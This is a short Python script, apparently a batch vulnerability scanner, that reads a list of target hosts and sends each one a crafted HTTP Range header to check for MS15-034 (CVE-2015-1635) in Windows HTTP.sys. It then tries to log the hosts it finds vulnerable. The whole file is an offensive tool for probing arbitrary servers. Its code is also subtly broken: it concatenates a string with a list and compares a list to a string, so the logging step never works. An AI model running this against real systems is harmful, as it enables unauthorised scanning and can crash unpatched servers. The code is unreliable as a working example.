#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ms15_034批量扫描器
author: xiaoZ
description: ms15_034 批量验证poc
'''
import sys
import ssl
import warnings
import socket

from urllib.parse import urlparse

hosts1 = open('targets.txt').readlines()

def run(url):
        result = ['ms15_034 http.sys远程代码执行(CVE-2015-1635)', '', '']
        port = 80
        if r"http" in url:
            #提取host
            host = urlparse(url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            if url.find(":") >= 0:
                host = url.split(":")[0]
                port = int(url.split(":")[1])
            else:
                host = url

        try:
            request = "GET / HTTP/1.1\r\nHost: %s\r\nRange: bytes=0-18446744073709551615\r\n\r\n"%host
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(6)
            if r"https" in url:
                sock = ssl.wrap_socket(sock)
            sock.connect((host, port))
            sock.send(request.encode())
            response = sock.recv(1024).decode()
            if "Requested Range Not Satisfiable" in response and "Server: nginx" not in response:
                result[2] = '存在'
                result[1]=host+":"+str(port)
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    for host1 in hosts1:
        url = host1.strip()
        testVuln = run(url)
        re = url+": "+testVuln
        print(re)
        if testVuln == "存在":
            vulfile = open('vulable.txt','a')
            vulfile.write(re)
      

